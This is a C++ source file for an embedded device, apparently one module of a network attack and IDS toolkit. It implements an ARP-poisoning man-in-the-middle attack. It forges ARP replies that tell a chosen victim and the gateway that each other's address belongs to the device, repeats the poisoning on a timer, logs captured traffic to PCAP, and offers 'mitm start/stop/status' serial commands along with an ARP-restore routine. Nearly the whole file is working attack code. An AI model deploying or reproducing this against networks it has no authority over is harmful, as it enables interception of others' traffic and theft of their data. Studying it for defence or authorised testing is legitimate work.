// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 0x4133

#include "attack_arp_mitm.h"

#include <string.h>

#include <Arduino.h>

#include "config.h"
#include "eth_frame.h"
#include "ids.h"
#include "inject.h"
#include "ip_util.h"
#include "state.h"

bool     mitmActive          = false;
uint8_t  mitmVictimIP[4]     = {0};
uint8_t  mitmVictimMAC[6]    = {0};
uint8_t  mitmGatewayMAC[6]   = {0};
uint32_t mitmLastPoison      = 0;
uint32_t mitmPktCount        = 0;  // packets relayed (forwarded through us)

void sendArpReply(const uint8_t* senderMAC, const uint8_t* senderIP, const uint8_t* targetMAC,
                  const uint8_t* targetIP) {
  uint16_t pos = 0;
  pos = buildEthHeader(txBuf, targetMAC, ETHERTYPE_ARP);

  pktWrite16(txBuf + pos, 0x0001);
  pos += 2;  // HW type: Ethernet
  pktWrite16(txBuf + pos, 0x0800);
  pos += 2;          // Proto: IPv4
  txBuf[pos++] = 6;  // HW addr len
  txBuf[pos++] = 4;  // Proto addr len
  pktWrite16(txBuf + pos, 0x0002);
  pos += 2;  // Op: Reply
  memcpy(txBuf + pos, senderMAC, 6);
  pos += 6;  // Sender MAC (spoofed)
  memcpy(txBuf + pos, senderIP, 4);
  pos += 4;  // Sender IP (spoofed)
  memcpy(txBuf + pos, targetMAC, 6);
  pos += 6;  // Target MAC
  memcpy(txBuf + pos, targetIP, 4);
  pos += 4;  // Target IP
  while (pos < 60)
    txBuf[pos++] = 0;

  sendRawFrame(txBuf, pos);
}

// ── Send poison ARPs to both victim and gateway ──
void mitmSendPoison() {
  // Tell victim: "gateway IP is at OUR mac"
  sendArpReply(mac, ourGW, mitmVictimMAC, mitmVictimIP);
  // Tell gateway: "victim IP is at OUR mac"
  sendArpReply(mac, mitmVictimIP, mitmGatewayMAC, ourGW);

  mitmPktCount += 2;
}

// ── Restore original ARP entries on both sides ──
void mitmRestore() {
  Serial.println("[MITM] Restoring original ARP entries...");
  for (int i = 0; i < 3; i++) {
    // Tell victim: "gateway IP is at REAL gateway MAC"
    sendArpReply(mitmGatewayMAC, ourGW, mitmVictimMAC, mitmVictimIP);
    // Tell gateway: "victim IP is at REAL victim MAC"
    sendArpReply(mitmVictimMAC, mitmVictimIP, mitmGatewayMAC, ourGW);
    delay(100);
  }
  Serial.println("[MITM] Sent 3 restore rounds");
}

// ── Start MitM between victim and our gateway ──
void mitmStart(const uint8_t* victimIP) {
  if (mitmActive) {
    Serial.println("[MITM] Already active. Use 'mitm stop' first.");
    return;
  }

  // Validate we have our own IP
  if (ourIP[0] == 0) {
    Serial.println("[MITM] No IP assigned. Cannot MitM without network config.");
    return;
  }

  // Don't poison ourselves
  if (memcmp(victimIP, ourIP, 4) == 0) {
    Serial.println("[MITM] Cannot target yourself.");
    return;
  }

  // Don't target the gateway directly (that's the other side of the pair)
  if (memcmp(victimIP, ourGW, 4) == 0) {
    Serial.println("[MITM] Cannot target the gateway itself.");
    return;
  }

  memcpy(mitmVictimIP, victimIP, 4);

  // Resolve victim MAC
  Serial.printf("[MITM] Resolving victim %u.%u.%u.%u...\n", victimIP[0], victimIP[1], victimIP[2],
                victimIP[3]);
  if (!resolveMacForIP(victimIP, mitmVictimMAC)) {
    Serial.println("[MITM] Failed to resolve victim MAC. Is the host up?");
    Serial.println("  Try: recon sweep first, then retry.");
    return;
  }
  Serial.printf("[MITM] Victim MAC:  %02X:%02X:%02X:%02X:%02X:%02X\n", mitmVictimMAC[0],
                mitmVictimMAC[1], mitmVictimMAC[2], mitmVictimMAC[3], mitmVictimMAC[4],
                mitmVictimMAC[5]);

  // Resolve gateway MAC
  Serial.printf("[MITM] Resolving gateway %u.%u.%u.%u...\n", ourGW[0], ourGW[1], ourGW[2],
                ourGW[3]);
  if (!resolveMacForIP(ourGW, mitmGatewayMAC)) {
    Serial.println("[MITM] Failed to resolve gateway MAC.");
    return;
  }
  Serial.printf("[MITM] Gateway MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", mitmGatewayMAC[0],
                mitmGatewayMAC[1], mitmGatewayMAC[2], mitmGatewayMAC[3], mitmGatewayMAC[4],
                mitmGatewayMAC[5]);

  // Start poisoning
  mitmActive = true;
  mitmPktCount = 0;
  mitmLastPoison = 0;  // poison immediately on next loop
  idsSetLed(COLOR_ORANGE);

  Serial.println();
  Serial.println("[MITM] ══════════════════════════════════════");
  Serial.printf("[MITM] ACTIVE: %u.%u.%u.%u <---> %u.%u.%u.%u\n", mitmVictimIP[0], mitmVictimIP[1],
                mitmVictimIP[2], mitmVictimIP[3], ourGW[0], ourGW[1], ourGW[2], ourGW[3]);
  Serial.println("[MITM] ARP poison sent every 2 seconds");
  Serial.println("[MITM] Captured traffic written to PCAP");
  Serial.println("[MITM] Use 'mitm stop' to restore and stop");
  Serial.println("[MITM] ══════════════════════════════════════");

  // Initial poison burst
  mitmSendPoison();
  delay(50);
  mitmSendPoison();
  mitmLastPoison = millis();
}

// ── Stop MitM and restore ARP tables ──
void mitmStop() {
  if (!mitmActive) {
    Serial.println("[MITM] Not active.");
    return;
  }

  mitmActive = false;
  mitmRestore();

  Serial.printf("[MITM] Stopped. %u poison packets sent total.\n", mitmPktCount);
  idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
}

// ── MitM command parser ──
void parseMitmCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (strncmp(cmd, "start", 5) == 0) {
    cmd += 5;
    while (*cmd == ' ')
      cmd++;

    if (*cmd == '\0') {
      Serial.println("[MITM] Usage: mitm start X.X.X.X");
      Serial.println("  Poisons ARP between target and gateway.");
      return;
    }

    uint8_t victimIP[4];
    if (!parseIP(cmd, victimIP)) {
      Serial.println("[MITM] Invalid IP. Usage: mitm start 192.168.1.50");
      return;
    }

    mitmStart(victimIP);
  } else if (strncmp(cmd, "stop", 4) == 0) {
    mitmStop();
  } else if (strncmp(cmd, "status", 6) == 0 || *cmd == '\0') {
    if (mitmActive) {
      Serial.println("[MITM] ═══ MitM Status ═══");
      Serial.printf("  State:    ACTIVE\n");
      Serial.printf("  Victim:   %u.%u.%u.%u (%02X:%02X:%02X:%02X:%02X:%02X)\n", mitmVictimIP[0],
                    mitmVictimIP[1], mitmVictimIP[2], mitmVictimIP[3], mitmVictimMAC[0],
                    mitmVictimMAC[1], mitmVictimMAC[2], mitmVictimMAC[3], mitmVictimMAC[4],
                    mitmVictimMAC[5]);
      Serial.printf("  Gateway:  %u.%u.%u.%u (%02X:%02X:%02X:%02X:%02X:%02X)\n", ourGW[0], ourGW[1],
                    ourGW[2], ourGW[3], mitmGatewayMAC[0], mitmGatewayMAC[1], mitmGatewayMAC[2],
                    mitmGatewayMAC[3], mitmGatewayMAC[4], mitmGatewayMAC[5]);
      Serial.printf("  Poison pkts: %u\n", mitmPktCount);
      Serial.printf("  Interval: %u ms\n", MITM_POISON_INTERVAL);
    } else {
      Serial.println("[MITM] Not active.");
      Serial.println("  mitm start X.X.X.X  - poison victim <-> gateway");
      Serial.println("  mitm stop            - stop and restore ARP");
      Serial.println("  mitm status          - show current state");
    }
  } else {
    Serial.println("[MITM] Commands:");
    Serial.println("  mitm start X.X.X.X  - start ARP poison (victim <-> gateway)");
    Serial.println("  mitm stop            - stop MitM, restore ARP tables");
    Serial.println("  mitm status          - show MitM state");
  }
}
